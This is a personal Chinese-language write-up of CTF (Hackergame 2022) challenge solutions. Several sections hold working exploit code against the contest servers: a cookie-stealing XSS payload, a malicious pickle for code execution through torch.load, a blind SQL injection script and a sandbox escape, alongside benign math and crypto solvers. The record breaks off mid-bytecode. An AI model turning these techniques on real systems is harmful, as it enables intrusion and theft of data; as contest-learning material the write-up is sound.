# SuperSodaSea 个人题解

总分：9350 / 第 4 名
- binary：3300 / 第 2 名
-  general：2300 / 第 5 名
-  math：2300 / 第 15 名
- web：1450 / 第 8 名

参赛感想：https://www.zhihu.com/question/561919414/answer/2738643298

## 签到

签到题，不知怎么的模型好像没加载出来……于是直接点了下提交看到 URL 里的 `result=????` 直接改了就过了。

## 猫咪问答喵

搜索题，前面几道都很容易搜到，第五问的 ssh key fingerprint 搜索时用的关键字有点问题浪费了点时间，第六问没辙了直接循环枚举日期提交找答案了。

## 家目录里的秘密

下载压缩包解压后直接搜索 `flag{` 就找到第一个 Flag 了。然后搜到 rclone 的文件夹里看到了这个配置文件：
```ini
[flag2]
type = ftp
host = ftp.example.com
user = user
pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
```
最开始还愣了半天想他真正的 FTP 服务器地址是什么，然后才意识到 pass 里面的密码应该是可逆的，于是搜了一下找到了 [这段 Go 代码](https://forum.rclone.org/t/how-to-retrieve-a-crypt-password-from-a-config-file/20051)，把密文丢进去就拿到 Flag 了。

## HeiLang

简单的正则查找替换。

<details>
<summary>Python 代码</summary>

```py
import re

regex = re.compile('a\\[(.+)\\] = (\d+)')

with open('getflag.hei.py') as file:
    for line in file:
        line = line.rstrip()
        match = regex.match(line)
        if match is None:
            print(line)
        else:
            for x in match[1].split('|'):
                print(f'a[{ x.strip() }] = { match[2] }')
```
</details>

## Xcaptcha

写了一小段 JavaScript 代码，粘贴到浏览器控制台里，刷新页面后并迅速按下回车执行就搞定了。

<details>
<summary>JavaScript 代码</summary>

```js
let i = 1;
for(const match of document.body.innerHTML.matchAll(/(\d+)\+(\d+)/g)) {
    document.getElementById(`captcha${i}`).value =
        `${BigInt(match[1]) + BigInt(match[2])}`;
    ++i;
}
document.getElementById('submit').click();
```
</details>

## 旅行照片 2.0

基本上都很简单，航班是白嫖 [Flightradar24](https://flightradar24.com) 的免费 7 天试用看的。卡了一下的是我邮编最开始填写成体育馆的邮编了，没想到酒店的邮编和体育馆的差了一位，还研究了半天以为自己航班找错了。

## 猜数字

一眼 `NaN`。

## LaTeX 机器人

第一问直接 `\input{/flag1}` 就看到了。第二问查了半天，最后用的是 ```\catcode`_=12 \catcode`\#=12 \input{/flag2}```。

## Flag 的痕迹

试了半天发现有个 `do=diff`，于是就看到 Flag 了。

## 安全的在线测评

第一问编译期没做权限设置，于是可以直接 `#include "../data/static.out"` 通过编译器报错看到静态数据的第一行。想看到第二行就在 `#include` 前面加一行 `int x =` 就能让报错位置换一下看到第二行了。

第二问想了半天，首先程序运行时的权限应该是没什么办法获取到数据的，还是得从编译的时候入手。

## 线路板

巧了，我电脑上一直装着 KiCAD。用 Gerber 查看器打开所有层，首先找到 Flag 位于 `ebaz_sdr-F_Cu.gbr`，然后发现遮挡的圆圈编号是 `D10`，于是用文本编辑器打开找到 `D10` 并且将这部分删除之后 Flag 就露出来了。

## Flag 自动机

一上来直接写了个代码向那个到处乱动的按钮发送 `WM_LBUTTONDOWN`，结果只弹出来一个提示没有权限的窗口，于是只能先逆向了。丢进 IDA 里查找和 `MessageBox` 相关的逻辑，发现在窗口消息处理函数的 `WM_COMMAND` 里判断 `lParam != 0x1BF52` 就会弹出对话框提示没有权限，所以改成直接给窗口发个 `lParam == 0x1BF52` 的 `WM_COMMAND` 就搞定了。

题外话：比赛结束看到官方 Writeup 才发现 `0x1BF52 == 114514`……

<details>
<summary>C 代码</summary>

```c
#include <windows.h>

int main() {
    HWND hwnd = FindWindowW(nullptr, L"flag 自动机");
    if(!hwnd) return 1;
    SendMessage(hwnd, WM_COMMAND, 3, 0x1BF52);
}
```
</details>

## 微积分计算小练习

首先看一眼服务器代码：

```py
driver.execute_script(f'document.cookie="flag={FLAG}"')
# ...
greeting = driver.execute_script(f"return document.querySelector('#greeting').textContent")
score = driver.execute_script(f"return document.querySelector('#score').textContent")
```

也就是说要构造请求在服务器段执行代码，获取 `cookie` 并将它放到 `greeting` 或者 `score` 里就行了。

微积分题看都不看，直接全填 0 然后提交。查看分享页面的源码发现有这样两行脚本：

```js
document.querySelector("#greeting").innerHTML = "您好，" + username + "！";
document.querySelector("#score").innerHTML = "您在练习中获得的分数为 <b>" + score + "</b>/100。";
```

既然这样只要在 `result` 的 `username` 里构造攻击就能获取到 Flag 了。当然直接 `<script>` 是不会执行的，需要用经典的 `<img src="" onerror="..."/>` 来执行代码。


<details>
<summary>JavaScript 代码</summary>

```js
console.log('http://202.38.93.111:10056/share?result=' + btoa('<img src="" onerror="document.querySelector('#greeting').textContent = document.cookie"></img>:0')))console.log('http://202.38.93.111:10056/share?result=' + btoa('<img src="" onerror="document.querySelector(\'#greeting\').textContent = document.cookie"></img>:0'))
// http://202.38.93.111:10056/share?result=PGltZyBzcmM9IiIgb25lcnJvcj0iZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2dyZWV0aW5nJykudGV4dENvbnRlbnQgPSBkb2N1bWVudC5jb29raWUiPjwvaW1nPjow
```
</details>

## 杯窗鹅影

第一问试了一下发现可以直接读 `../flag1` 这个文件。第二问试了半天发现可以 `CreateProcess` 执行 `\\?\unix\readflag` 这个路径下的文件。

<details>
<summary>C 代码</summary>

flag1
```c
#include <stdio.h>

int main() {
    FILE* file = fopen("../flag1", "r");
    if(!file) {
        puts("Failed to open file!");
        return 1;
    }
    
    char buffer[1024];
    fscanf(file, "%s", buffer);
    fclose(file);
    
    puts(buffer);
}
```

flag2
```c
#include <stdio.h>
#include <windows.h>

int main(int argc, char** argv) {
    STARTUPINFOA si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    char commandLine[1024] = "\\\\?\\unix\\readflag";
    if(!CreateProcessA(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcessA failed %d\n", (int)GetLastError());
        return 1;
    }
}
```
</details>

## 蒙特卡罗轮盘赌

看源码发现随机种子用的 `srand((unsigned)time(0) + clock())`，于是想到 Codeforces 上 Hack 常用的方法：以当前时间点附近的一系列种子生成随机序列，总有一个能碰上的。因为最多错两个，所以前两次随便输入来获取随机种子，找到序列后输入后三个即可。

<details>
<summary>C++ 代码</summary>

```c++
#include <cmath>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>

#include <array>
#include <string>
#include <map>

double rand01() {
    return (double)std::rand() / RAND_MAX;
}

std::array<int, 5> get(std::uint32_t seed) {
    std::array<int, 5> result;
    std::srand(seed);
    for(int i = 0; i < 5; ++i) {
        int M = 0;
        int N = 400000;
        for (int j = 0; j < N; j++) {
            double x = rand01();
            double y = rand01();
            if (x*x + y*y < 1) M++;
        }
        double pi = (double)M / N * 4;
        result[i] = std::round(pi * 1e5);
    }
    return result;
}

int main() {
    int s1, s2;
    std::scanf("%d%d", &s1, &s2);
    
    std::uint32_t m = time(0);
    for(std::uint32_t seed = m - 100; ; ++seed) {
        auto data = get(seed);
        if(s1 == data[0] && s2 == data[1]) {
            for(int i = 0; i < 5; ++i)
                std::printf("%d\n", data[i]);
            break;
        }
    }
    
    return 0;
}
```
</details>

## 二次元神经网络

最开始以为是要手动构造神经网络的权值，但这道题标的是 web，研究了一下网络后发现最后一层 Linear 输入只有 8 个参数，而输出有 10 张图，直接构造应该是不太可能的。于是开始考虑是不是 pt 文件本身存在漏洞。

找到 [`torch.load` 的文档](https://pytorch.org/docs/stable/generated/torch.load.html) 发现 **WARNING** 赫然在目：
> torch.load() unless weights_only parameter is set to True, uses pickle module implicitly, which is known to be insecure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never load data that could have come from an untrusted source in an unsafe mode, or that could have been tampered with. Only load data you trust.

于是快速学了一下 `pickle` 执行任意代码的方法，把预先生成好的 JSON 直接写入目标文件然后直接退出就行了。

顺便，我最开始在写入文件后调用 `exit()` 提前退出，结果提交上去怎么都是报错，但本地试看起来也没有任何异常，最后试出来可以靠 `os._exit()` 正确退出。没想到看了题解发现根本不需要 exit 直接让后面代码自己报错退出就行，很迷。

<details>
<summary>Python 代码</summary>

```python
import base64
import io
import json

import matplotlib.image
import torch

if __name__ == '__main__':
    pixels_10 = torch.load('dataset/pixels_10.pt', map_location = 'cpu')
    images = []
    for i in range(10):
        outIO = io.BytesIO()
        matplotlib.image.imsave(outIO, pixels_10[i].numpy(), format = 'png')
        images.append(base64.b64encode(outIO.getvalue()).decode())
    
    with open('output/images.json', 'w') as file:
        json.dump({ 'gen_imgs_b64': images }, file)
    
    with open('output/images.json', 'r') as file:
        data = file.read()
    
    class Hack(object):
        def __reduce__(self):
            return exec, (f'import os\nopen(\'/tmp/result.json\', \'w\').write(\'{data}\')\nos._exit()', )
    
    pt = {}
    pt['hack'] = Hack()
    torch.save(pt, 'Hack.pt')
```

</details>

## 惜字如金

**PARTIAL UNSOLVE**

第一问为了速度快一点试着用 Rust 写枚举了，但没想到可能性竟然意外的少，早知道直接 Python 了 :(

第二问是真没想法，题解的 Coppersmith 方法也根本没听说过，以后还得多学习一个。

<details>
<summary>Rust 代码</summary>

```rust
use std::str::from_utf8;

use sha2::{Digest, Sha384};

fn sha384(data: &[u8]) -> [u8; 96] {
    let mut hasher = Sha384::new();
    hasher.update(data);
    let mut result = [0u8; 96];
    hex::encode_to_slice(hasher.finalize(), &mut result).unwrap();
    result
}

fn issub(a: &[u8], b: &[u8]) -> bool {
    let mut p = 0;
    for x in a {
        if *x == b[p] {
            p += 1;
            if p == b.len() { return true; }
        }
    }
    false
}

const SECRET: &[u8] = b"ustc.edu.cn";
const DIGEST: &[u8] = b"ec18f9dbc4aba825c7d4f9c726db1cb0d0babf47fa170f33d53bc62074271866a4e4d1325dc27f644fdad";
const LEN: usize = 39;

fn check(data: &mut [u8]) -> bool {
    let hash = sha384(data);
    let result = issub(&hash, DIGEST);
    if result {
        let s = from_utf8(&data).unwrap();
        let t = from_utf8(&hash).unwrap();
        println!("Found: sha384({s}) = {t}");
    }
    result
}

fn isa(x: u8) -> bool {
    x == b'a' || x == b'e' || x == b'i' || x == b'o' || x == b'u'
}
fn isb(x: u8) -> bool {
    x >= b'a' && x <= b'z'
}
fn isc(x: u8) -> bool {
    isb(x) && !isa(x)
}

fn dfs(data: &mut [u8], p: usize, q: usize) -> bool {
    // 这里偷了个懒，假设输入中最后一个字符是辅音了
    if p == SECRET.len() - 1 {
        for i in q .. LEN { data[i] = SECRET[p]; }
        if check(data) { return true; }
        if q < data.len() - 1 {
            for c in b"aeiou" {
                data[LEN - 1] = *c;
                if check(data) { return true; }
            }
        }
        return false;
    }
    let x = SECRET[p];
    if isc(x) {
        let mut l = 1;
        while SECRET.len() - (p + 1) < LEN - (q + l) {
            data[q + l - 1] = x;
            if dfs(data, p + 1, q + l) { return true; }
            if SECRET.len() - (p + 1) < LEN - (q + l + 1) && !isb(SECRET[p + 1]) {
                if SECRET.len() - p < LEN - q {
                    for c in b"aeiou" {
                        data[q + l] = *c;
                        if dfs(data, p + 1, q + l + 1) { return true; }
                    }
                }
            }
            l += 1;
        }
    } else {
        data[q] = x;
        if dfs(data, p + 1, q + 1) { return true; }
    }
    false
}

fn main() {
    let mut data = [0u8; LEN];
    dfs(&mut data, 0, 0);
}
```
</details>

## 不可加密的异世界

最开始搜到 DES 有弱密钥这个概念就直接忘了有 AES 这回事使劲往 DES 想了，结果第一问这么想都没做出来，反而是第三问是首先做出来的。

第一问：用 AES，任意密钥反算全0密文的明文即可，提交时用 OFB 模式。

第二问：用 DES，选择 0101010101010101 弱密钥，反算全0密文的明文，然后用 OFB 模式提交时 iv 交替使用全0和全0的明文即可。其实任意密钥都行，但是最开始就搜到 DES 弱密钥就直接都往这个方向想了，而且这样交替只需要算一次。

第三问：会反算 CRC 就能做，网上找了个反算 CRC32 的代码改了一下变成 CRC128，然后反算 CRC128 = 01010101010101010101010101010101 的明文，用 ECB 模式提交上去就能创造奇迹了。弱密钥加密等于解密于是加密两次等于啥都没做。

上面三问输入 name 时都只要直接回车就行了，根本用不到。

<details>
<summary>Python 代码</summary>

疏忽的神
```python
from magic_box import *

if __name__ == "__main__":
    key = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    box = Magic_box('AES', 'ECB', key)
    print(key.hex() + box.auto_dec(key).hex())

'''
1

AES
OFB
00000000000000000000000000000000140f0f1011b5223d79587717ffd9ec3a
'''
```

心软的神
```python
from magic_box import *

if __name__ == "__main__":
    n = 10
    key = b'\x01\x01\x01\x01\x01\x01\x01\x01'
    k0 = b'\x00\x00\x00\x00\x00\x00\x00\x00'
    box = Magic_box('DES', 'ECB', key)
    k1 = box.auto_dec(k0)
    for i in range(n):
        print(key.hex() + [k1, k0][i % 2].hex())

'''
2

DES
OFB
01010101010101018ca64de9c1b123a7
01010101010101010000000000000000
01010101010101018ca64de9c1b123a7
01010101010101010000000000000000
01010101010101018ca64de9c1b123a7
01010101010101010000000000000000
01010101010101018ca64de9c1b123a7
01010101010101010000000000000000
01010101010101018ca64de9c1b123a7
01010101010101010000000000000000
'''
```

严苛的神
```python
from Crypto.Util.number import bytes_to_long, long_to_bytes

crc128Poly = 0x883ddfe55bba9af41f47bd6e0b0d8f8f

def getCrc128Table():
    table = [0 for _ in range(256)]
    for i in range(256):
        r = i
        for _ in range(8):
            if r & 1:
                r = (r >> 1) ^ crc128Poly
            else:
                r >>= 1
        table[i] = r
    return table
crc128Table = getCrc128Table()

def crc128_(data):
    crc = (1 << 128) - 1

    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ (crc128Poly & -(crc & 1))

    return crc ^ ((1 << 128) - 1)

def crc128(data):
    crc = (1 << 128) - 1

    for b in data:
        crc = (crc >> 8) ^ crc128Table[b ^ (crc & 0xFF)]

    return crc ^ ((1 << 128) - 1)

if __name__ == '__main__':
    target = b'\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01'
    
    crc = bytes_to_long(target) ^ ((1 << 128) - 1)
    tableIndices = [0 for _ in range(16)]
    for i in range(15, -1, -1):
        for j in range(256):
            ok = False
            if ((crc ^ crc128Table[j]) >> 120) == 0:
                tableIndices[i] = j
                crc = (crc ^ crc128Table[j]) << 8
                ok = True
                break
        assert ok, "Not found!"
    result = [0 for _ in range(16)]
    crc = (1 << 128) - 1
    for i in range(16):
        result[i] = (crc ^ tableIndices[i]) & 0xFF
        crc = (crc >> 8) ^ crc128Table[result[i] ^ (crc & 0xFF)]
    result = bytes(result)
    assert long_to_bytes(crc128(result), 16) == target
    print(result.hex())

'''
3

DES
ECB
a61e71dc949e8530a9e02ea3d1eb39fa
'''
```
</details>

## 置换魔群

第一问直接求逆元即可。

第二问离散对数直接用 BSGS 暴力算了，结果发现用 Python 算很容易超时，于是用 Rust 重新实现了一遍，运气好不随机到阶非常大的数据就能过了。和服务器交互部分的代码太丑就不放了。

<details>
<summary>Rust 代码</summary>

```rust
use std::{collections::HashMap, fs::File, io::{Read, Write}};

use num::integer::lcm;

fn order(a: &Vec<u32>) -> u64 {
    let mut o = 1;
    let mut visited = vec![false; a.len()];
    for i in 0 .. a.len() {
        if visited[i] { continue; }
        let mut p = i;
        let mut c = 0;
        while !visited[p] {
            visited[p] = true;
            p = a[p] as usize;
            c += 1;
        }
        o = lcm(o, c);
    }
    o
}

fn idg(n: u32) -> Vec<u32> {
    let mut result = vec![0u32; n as usize];
    for i in 0 .. n {
        result[i as usize] = i;
    }
    result
}

fn mulg(a: &Vec<u32>, b: &Vec<u32>) -> Vec<u32> {
    assert_eq!(a.len(), b.len());
    let mut result = vec![0u32; a.len()];
    for i in 0 .. a.len() {
        result[i as usize] = a[b[i as usize] as usize];
    }
    result
}
fn powg(a: &Vec<u32>, x: u64) -> Vec<u32> {
    let mut result = idg(a.len() as u32);
    let mut i = x;
    let mut b = a.clone();
    while i > 0 {
        if (i & 1) == 1 {
            result = mulg(&result, &b);
        }
        b = mulg(&b, &b);
        i >>= 1;
    }
    result
}

fn bsgs(a: &Vec<u32>, b: &Vec<u32>) -> u64 {
    assert_eq!(a.len(), b.len());
    let o = order(a);
    println!("=== Order: {o} ===");
    let step = f64::sqrt(o as f64) as u64;
    
    println!("=== GS ===");
    let mut hash_map = HashMap::<Vec<u32>, u64>::new();
    let gs = powg(a, step);
    let mut e = idg(a.len() as u32);
    for i in (0 .. o).step_by(step as usize) {
        hash_map.insert(e.clone(), i);
        e = mulg(&e, &gs);
    }
    
    println!("=== BS ===");
    let mut e = b.clone();
    for i in 0 .. step {
        if let Some(x) = hash_map.get(&e) {
            return if *x >= i { x - i } else { x + a.len() as u64 - i };
        }
        e = mulg(&e, &a);
    }
    
    panic!("Not found!");
}

fn main() {
    let mut input_file = File::open("./Input.txt").unwrap();
    let mut output_file = File::create("./Output.txt").unwrap();

    let mut input = String::new();
    input_file.read_to_string(&mut input).unwrap();
    let lines: Vec<String> = input
        .split("\n")
        .map(|s: &str| s.to_string().trim().to_string())
        .collect();
    let a: Vec<u32> = lines[0]
        .split(" ")
        .map(|s: &str| s.parse::<u32>().unwrap() - 1)
        .collect();
    let b: Vec<u32> = lines[1]
        .split(" ")
        .map(|s: &str| s.parse::<u32>().unwrap() - 1)
        .collect();
    
    output_file.write(bsgs(&a, &b).to_string().as_bytes()).unwrap();
}
```

</details>

第三问就老老实实写了个 DP 预处理最大阶的划分方案，然后运行时用中国剩余定理求解，详见代码。

<details>
<summary>Python 代码</summary>

```py
import re

from pwn import *
from sympy.ntheory.modular import crt

def s2n(x): return [int(x) for x in re.findall(r"\-?\d+\.?\d*", x)]

def eulerSieve(n):
    primes = []
    visit = [False for _ in range(n + 1)]
    visit[0] = True
    visit[1] = True
    i = 2
    while i <= n:
        if not visit[i]:
            primes.append(i)
        for p in primes:
            x = i * p
            if x > n: break
            visit[x] = True
            if i % p == 0: break
        i += 1
    return primes

n0 = 2000
primes = eulerSieve(n0)
dp = [[None for _ in range(n0 + 1)] for _ in range(n0 + 1)]
dp[0][0] = (1, {}, {})
for i in range(n0):
    if i % 10 == 0: print(i)
    for j in range(i + 1):
        e = dp[i][j]
        if e is None: continue
        lim = max(n0 - i, i - j)
        for prime in primes:
            if prime > lim: break
            if prime not in e[2]:
                d = (prime - 1) * prime ** e[1][prime] if prime in e[1] else prime
                z = e[0] * prime
                if i + d <= n0 and (dp[i + d][j] is None or dp[i + d][j][0] < z):
                    g = dict(e[1])
                    g[prime] = e[1][prime] + 1 if prime in e[1] else 1
                    dp[i + d][j] = (z, g, e[2])
            if prime not in e[1]:
                d = (prime - 1) * prime ** e[2][prime] if prime in e[2] else prime
                z = e[0] * prime
                if j + d < i and (dp[i][j + d] is None or dp[i][j + d][0] < z):
                    g = dict(e[2])
                    g[prime] = e[2][prime] + 1 if prime in e[2] else 1
                    dp[i][j + d] = (z, e[1], g)
cache = [(1, [], [])]
for i in range(1, n0 + 1):
    cache.append(cache[i - 1])
    for j in range(i + 1):
        if (dp[i][j] is not None) and dp[i][j][0] > cache[i][0]:
            ls = ([], [])
            for k in range(2):
                for p, q in dp[i][j][k + 1].items():
                    ls[k].append(p ** q)
            cache[i] = (dp[i][j][0], ls[0], ls[1])
    print(i, cache[i])

conn = remote('202.38.93.111', 10114)
print(conn.recvuntil(b'Please input your token: ').decode())
conn.send(b'<Token>\n')
print(conn.readuntil(b'> your choice: ').decode())
conn.send(b'3\n')
print(conn.readuntil(b'Now, go and crack my big private key!\n').decode())
for _ in range(15):
    info1 = conn.readuntil(b'Now you can choose the generator twice!\n').decode()
    regex1 = re.compile('\\[\\+\\] DH public key: n = (\d+)\n\\[\\+\\] The upper bound for my private key is (\d+)\n')
    match1 = regex1.search(info1)
    n, pri = int(match1[1]), int(match1[2])
    print(f'n = {n}')
    print(f'pri =\t{pri}')
    print(f'cache =\t{cache[n][0]}')
    if cache[n][0] < pri:
        print('WARNING: cache[n][0] < pri')
    mods = []
    rems = []
    
    for i in range(2):
        nums = cache[n][i + 1]
        arr = [i + 1 for i in range(n)]
        q = 0
        for num in nums:
            arr[q] = q + num
            for i in range(1, num):
                arr[q + i] = q + i
            q += num
        print(conn.readuntil(b'(a list): ').decode())
        conn.send(str(arr).encode() + b'\n')
        info2 = conn.readuntil(b'\n').decode()
        regex2 = re.compile('\\[\\+\\] The public key \\d : (\\[[^\\]]+\\])\n')
        match2 = regex2.search(info2)
        arr = s2n(match2[1])
        assert len(arr) == n
        q = 0
        for num in nums:
            x = -1
            for i in range(num):
                if arr[q + i] == q + 1:
                    x = i
                    break
            assert x != -1
            mods.append(num)
            rems.append(x)
            q += num
    result = crt(mods, rems)[0]
    print(f'Result: {result}')
    conn.send(str(result).encode() + b'\n')

print(conn.readuntil(b'}\n').decode(), end = '')
```
</details>

## 光与影

SDF 这我熟，直接把网页保存到本地 `.html` 然后打开 Fragment Shader 改一下跑起来就行了。第一次尝试把那个看起来很可疑的 `t5` 删掉，没想到结果直接就出来了。

## 矩阵之困

**UNSOLVE**

没做出来，看官方题解才发现原来是矩阵乘法优化，完全没想到。

## 你先别急

一上来先用 sqlmap 扫了一下一无所获，看起来只能手动玩了。试了一下能不能在用户名里注入，果然可以，而且直接猜出来有一个 flag 表，里面有个叫 flag 字段（就不能换个随即一点的名称增加一下难度吗），不过得通过识别验证码来读取结果，另外输入非法用户名或者 SQL 有报错的话会返回全英文验证码（难度9）。由于试了一下发现 flag 只有20位，于是懒得弄自动识别，靠手动识别验证码二分来获取 flag 了。

<details>
<summary>JavaScript 代码</summary>

```js
import fs from 'fs';
import process from 'process';
import readline from 'readline';

import fetch, { FormData } from 'node-fetch';

let cookie = 'session=/* ... */';

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: true,
});

function input(text) {
    return new Promise(resolve => {
        rl.question(text, result => {
            if(result == 'n') resolve(false);
            else if(result == 'y') resolve(true);
            else resolve(input(text));
        })
    });
}

async function check(flag) {
    const params = new URLSearchParams();
    params.append('username', `' union select 1 from flag where flag >= '${flag}' --`);
    const response = await fetch('http://202.38.93.111:11230/captcha', {
        method: 'POST', 
        body: params,
        headers: {
            'Cookie': cookie,
        },
    });

    const data = await response.json();
    if(data.status === 'ok') {
        fs.writeFileSync('Result.png', Buffer.from(data.result, 'base64'));
    }
    
    return await input(`${flag}> `);
}

const length = 20;
let flag = 'flag{';
// 不直接遍历所有 ASCII 字符是防止奇怪的字符被过滤导致二分出错，还好 Flag 里没这些字符
let chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}'
while(flag.length < 20) {
    let l = 0, r = chars.length - 1;
    while(l < r) {
        let mid = ((l + r) >> 1) + 1;
        if(await check(flag + chars[mid])) {
            l = mid;
        } else {
            r = mid - 1;
        }
    }
    flag += chars[l];
    console.log(`${flag.length}: ${flag}`)
}
```
</details>

## 链上记忆大师

**PARTIAL UNSOLVE**

第一问属于是区块链入门了。第二问很容易想到利用 gas 来传递信息，结果本地测了一下才发现这循环的 gas 消耗竟然不是线性增加的！这就有点头疼了，凑了半天公式最后还是偷懒部分打表解决了。（看了题解才知道可能是由于函数调用时只给剩下 gas 的 $\frac{63}{64}$ 导致的。

第三问看了题解才知道还有访问过的内存 gas 消耗会少这回事，知识盲区啊。（感觉有点像利用 Meltdown 漏洞中利用缓存与否的访问时间差距获取信息啊。）

<details>
<summary>Solidity 代码</summary>

记忆练习
```solidity
pragma solidity =0.8.17;

import "./challenge1.sol";

contract Hack1 is MemoryMaster {
    uint256 private number;
    
    constructor() {}
   
    function memorize(uint256 n) external {
        number = n;
    }
    function recall() external view returns (uint256) {
        return number;
    }
}
// 608060405234801561001057600080fd5b50610150806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063d4270d601461003b578063dd7bfbb914610059575b600080fd5b610043610075565b60405161005091906100a1565b60405180910390f35b610073600480360381019061006e91906100ed565b61007e565b005b60008054905090565b8060008190555050565b6000819050919050565b61009b81610088565b82525050565b60006020820190506100b66000830184610092565b92915050565b600080fd5b6100ca81610088565b81146100d557600080fd5b50565b6000813590506100e7816100c1565b92915050565b600060208284031215610103576101026100bc565b5b6000610111848285016100d8565b9150509291505056fea2646970667358221220fc11f7cf4f2d7a9f4b6067c38c7542be8828617fbe9bcb141128bef9af4db40564736f6c63430008110033
```

牛刀小试
```solidity
pragma solidity =0.8.17;

import "./challenge2.sol";

contract Hack2 is MemoryMaster {
    constructor() {}
   
    function memorize(uint16 n) external {
        while(n > 0) { --n; }
    }
    
    uint32[] table = [
        49188845, 49008692, 48828552, 48648411, 48468271, 48288130, 48107989, 47927849,
        47747708, 47567567, 47387427, 47207286, 47027146, 46847005, 46666864, 46486724,
        46306583, 46126442, 45946302, 45766161, 45586021, 45405880, 45225739, 45045599,
        44865458, 44685317, 44505177, 44325036, 44144896, 43964755, 43784614, 43604474,
        43424333, 43244192, 43064052, 42883911, 42703771, 42523630, 42343489, 42163349,
        41983208, 41803067, 41622927, 41442786, 41262646, 41082505, 40902364, 40722224,
        40542083, 40361942, 40181802, 40001661, 39821521, 39641380, 39461239, 39281099,
        39100958, 38920817, 38740677, 38560536, 38380396, 38200255, 38020114, 37839974,
        37659833, 37479692, 37383678
    ];
    function recall() external view returns (uint16) {
        uint32 r = uint32(gasleft());
        if(r == 49189217) return 0;
        if(r == 49189025) return 1;
        if(r == 37383678) return 65535;
        uint32 i = 0;
        while(true) {
            if(table[i + 1] < r) {
                return uint16(2 + 1000 * i + (table[i] - r) / 180);
            }
            ++i;
        }
    }
}
// 60806040526040518061086001604052806302ee8fed63ffffffff1681526020016302ebd03463ffffffff1681526020016302e9108863ffffffff1681526020016302e650db63ffffffff1681526020016302e3912f63ffffffff1681526020016302e0d18263ffffffff1681526020016302de11d563ffffffff1681526020016302db522963ffffffff1681526020016302d8927c63ffffffff1681526020016302d5d2cf63ffffffff1681526020016302d3132363ffffffff1681526020016302d0537663ffffffff1681526020016302cd93ca63ffffffff1681526020016302cad41d63ffffffff1681526020016302c8147063ffffffff1681526020016302c554c463ffffffff1681526020016302c2951763ffffffff1681526020016302bfd56a63ffffffff1681526020016302bd15be63ffffffff1681526020016302ba561163ffffffff1681526020016302b7966563ffffffff1681526020016302b4d6b863ffffffff1681526020016302b2170b63ffffffff1681526020016302af575f63ffffffff1681526020016302ac97b263ffffffff1681526020016302a9d80563ffffffff1681526020016302a7185963ffffffff1681526020016302a458ac63ffffffff1681526020016302a1990063ffffffff16815260200163029ed95363ffffffff16815260200163029c19a663ffffffff16815260200163029959fa63ffffffff1681526020016302969a4d63ffffffff168152602001630293daa063ffffffff1681526020016302911af463ffffffff16815260200163028e5b4763ffffffff16815260200163028b9b9b63ffffffff168152602001630288dbee63ffffffff1681526020016302861c4163ffffffff1681526020016302835c9563ffffffff1681526020016302809ce863ffffffff16815260200163027ddd3b63ffffffff16815260200163027b1d8f63ffffffff1681526020016302785de263ffffffff1681526020016302759e3663ffffffff168152602001630272de8963ffffffff1681526020016302701edc63ffffffff16815260200163026d5f3063ffffffff16815260200163026a9f8363ffffffff168152602001630267dfd663ffffffff168152602001630265202a63ffffffff168152602001630262607d63ffffffff16815260200163025fa0d163ffffffff16815260200163025ce12463ffffffff16815260200163025a217763ffffffff16815260200163025761cb63ffffffff168152602001630254a21e63ffffffff168152602001630251e27163ffffffff16815260200163024f22c563ffffffff16815260200163024c631863ffffffff168152602001630249a36c63ffffffff168152602001630246e3bf63ffffffff168152602001630244241263ffffffff168152602001630241646663ffffffff16815260200163023ea4b963ffffffff16815260200163023be50c63ffffffff16815260200163023a6dfe63ffffffff16815250600090604361044e929190610461565b5034801561045b57600080fd5b5061052e565b828054828255906000526020600020906007016008900481019282156105005791602002820160005b838211156104ce57835183826101000a81548163ffffffff021916908363ffffffff160217905550926020019260040160208160030104928301926001030261048a565b80156104fe5782816101000a81549063ffffffff02191690556004016020816003010492830192600103026104ce565b505b50905061050d9190610511565b5090565b5b8082111561052a576000816000905550600101610512565b5090565b61048f8061053d6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063c3f351e01461003b578063d4270d6014610057575b600080fd5b61005560048036038101906100509190610232565b610075565b005b61005f610097565b60405161006c919061026e565b60405180910390f35b5b60008161ffff161115610094578061008d906102b8565b9050610076565b50565b6000805a90506302ee91618163ffffffff16036100b85760009150506101f0565b6302ee90a18163ffffffff16036100d35760019150506101f0565b63023a6dfe8163ffffffff16036100ef5761ffff9150506101f0565b60005b6001156101ed578163ffffffff16600060018361010f91906102f1565b63ffffffff168154811061012657610125610329565b5b90600052602060002090600891828204019190066004029054906101000a900463ffffffff1663ffffffff1610156101dc5760b48260008363ffffffff168154811061017557610174610329565b5b90600052602060002090600891828204019190066004029054906101000a900463ffffffff166101a59190610358565b6101af91906103bf565b816103e86101bd91906103f0565b60026101c991906102f1565b6101d391906102f1565b925050506101f0565b806101e69061042d565b90506100f2565b50505b90565b600080fd5b600061ffff82169050919050565b61020f816101f8565b811461021a57600080fd5b50565b60008135905061022c81610206565b92915050565b600060208284031215610248576102476101f3565b5b60006102568482850161021d565b91505092915050565b610268816101f8565b82525050565b6000602082019050610283600083018461025f565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006102c3826101f8565b9150600082036102d6576102d5610289565b5b600182039050919050565b600063ffffffff82169050919050565b60006102fc826102e1565b9150610307836102e1565b9250828201905063ffffffff81111561032357610322610289565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b6000610363826102e1565b915061036e836102e1565b9250828203905063ffffffff81111561038a57610389610289565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b60006103ca826102e1565b91506103d5